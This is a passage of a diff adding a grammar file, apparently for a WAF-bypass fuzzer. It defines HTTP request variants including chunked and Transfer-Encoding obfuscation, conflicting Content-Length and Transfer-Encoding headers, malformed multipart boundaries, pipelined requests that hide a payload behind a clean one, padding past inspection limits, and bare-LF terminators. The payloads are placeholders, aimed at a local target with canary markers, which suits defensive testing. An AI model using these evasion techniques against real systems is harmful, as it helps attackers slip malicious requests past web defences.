+<chunked_request> = [weight=2] <request_line_body><host_header><wf_meta><ct_form><te_chunked><opt_headers><line_end><chunked_body>
+# TE obfuscation
+<chunked_request> = <request_line_body><host_header><wf_meta><ct_form><te_obfused><opt_headers><line_end><chunked_body>
+# CL + TE conflict — RFC 9112 §6.3: TE takes precedence
+<chunked_request> = <request_line_body><host_header><wf_meta><ct_form><te_chunked><cl_header><opt_headers><line_end><chunked_body>
+# With Trailer declaration
+<chunked_request> = <request_line_body><host_header><wf_meta><ct_form><te_chunked><trailer_decl><opt_headers><line_end><chunked_body>
+# With Expect: 100-continue (CVE-2025-32094)
+<chunked_request> = <request_line_body><host_header><wf_meta><ct_form><te_chunked><expect_header><opt_headers><line_end><chunked_body>
+# Chunked JSON
+<chunked_request> = <request_line_body><host_header><wf_meta><ct_json><te_chunked><opt_headers><line_end><chunked_body>
+
+# ─── §8.4  Multipart request ────────────────────────────────────────────
+
+<multipart_request> = [weight=2] POST<sp_sep><abs_path><sp_sep><http_version><line_end><host_header><wf_meta><mp_ct_header><cl_header><opt_headers><line_end><mp_body>
+# Multipart with chunked TE (avoid CL — body is chunked multipart)
+<multipart_request> = POST<sp_sep><abs_path><sp_sep><http_version><line_end><host_header><wf_meta><mp_ct_header><te_chunked><opt_headers><line_end><mp_body>
+
+<mp_ct_header> = [weight=3] <ct_field_name>:<ows>multipart/form-data; boundary=wfbound<line_end>
+# Quoted boundary (RFC 2046 §5.1.1 permits)
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary="wfbound"<line_end>
+# Mixed subtype (WAF may only inspect form-data)
+<mp_ct_header> = <ct_field_name>:<ows>multipart/mixed; boundary=wfbound<line_end>
+# Case tricks
+<mp_ct_header> = <ct_field_name>:<ows>Multipart/Form-Data; boundary=wfbound<line_end>
+# Duplicate boundary parameter (RFC ambiguous — some parsers use first, some last)
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary=wfbound; boundary=wf-fake<line_end>
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary=wf-fake; boundary=wfbound<line_end>
+# Leading/trailing whitespace in boundary value
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary= wfbound<line_end>
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary=wfbound <line_end>
+# boundary= with tab
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary=<htab>wfbound<line_end>
+# No space after semicolon
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data;boundary=wfbound<line_end>
+# boundary value with special chars (RFC allows most bcharsnospace)
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary=wfbound+x<line_end>
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; boundary=wfbound.1<line_end>
+# Uppercase BOUNDARY
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; BOUNDARY=wfbound<line_end>
+# charset before boundary
+<mp_ct_header> = <ct_field_name>:<ows>multipart/form-data; charset=utf-8; boundary=wfbound<line_end>
+# Fake outer type (some WAFs only inspect form-data)
+<mp_ct_header> = <ct_field_name>:<ows>application/x-www-form-urlencoded; boundary=wfbound<line_end>
+
+# =============================================================================
+# §9  Pipelining — WAF-bypass via request smuggling lite
+# =============================================================================
+# WAF inspects request #1 (clean), backend also processes request #2 (payload).
+# Not full HRS — just two requests in sequence on same connection.
+
+<pipelined_request> = <clean_prefix_request><payload_suffix_request>
+
+<clean_prefix_request> = GET<sp_sep>/health<sp_sep>HTTP/1.1<crlf>Host:<ows>target.local<crlf>X-WF-Request-ID: grammar-pipe-<hex len=6><crlf>Connection:<ows>keep-alive<crlf><crlf>
+
+<payload_suffix_request> = POST<sp_sep><abs_path><sp_sep><http_version><line_end><host_header>X-WF-Canary-Marker: <canary><crlf><ct_form><cl_header>Connection:<ows>close<line_end><line_end><form_body>
+
+# =============================================================================
+# §10  Body Padding — nowafpls-style inspection limit bypass
+# =============================================================================
+# Most WAFs stop inspecting body after N bytes (8KB-128KB).
+# Pad with junk data, then place real payload after the limit.
+
+<padded_body_request> = <request_line_body><host_header><wf_meta><ct_form><cl_header><opt_headers><line_end><padded_form_body>
+
+# Padding before payload — WAF scans padding, misses the payload at the end
+<padded_form_body> = junk=<junk_padding>&c=<canary>&data=<payload>
+
+<junk_padding> = <string min=8192 max=8192 charset=alphanumeric><string min=8192 max=8192 charset=alphanumeric><string min=8192 max=8192 charset=alphanumeric><string min=8192 max=8192 charset=alphanumeric><string min=8192 max=8192 charset=alphanumeric><string min=8192 max=8192 charset=alphanumeric><string min=8192 max=8192 charset=alphanumeric><string min=8192 max=8192 charset=alphanumeric>
+
+# =============================================================================
+# §11  Bare-LF Request — line terminator confusion
+# =============================================================================
+# Entire request uses \n instead of \r\n.
+# Some WAFs only parse CRLF; backends often accept bare LF.
+
+<bare_lf_request> = <method_body><sp><request_target><sp><http_version><nl>Host:<sp><host_value><nl>X-WF-Request-ID: grammar-lf-<hex len=6><nl>X-WF-Canary-Marker: <canary><nl><ct_form><bare_lf_cl><opt_headers_lf><nl><form_body>
+
+<bare_lf_cl> = Content-Length:<sp><cl_value><nl>
+<opt_headers_lf> = User-Agent:<sp>wf-grammar/2.0<nl>Connection:<sp>keep-alive<nl>
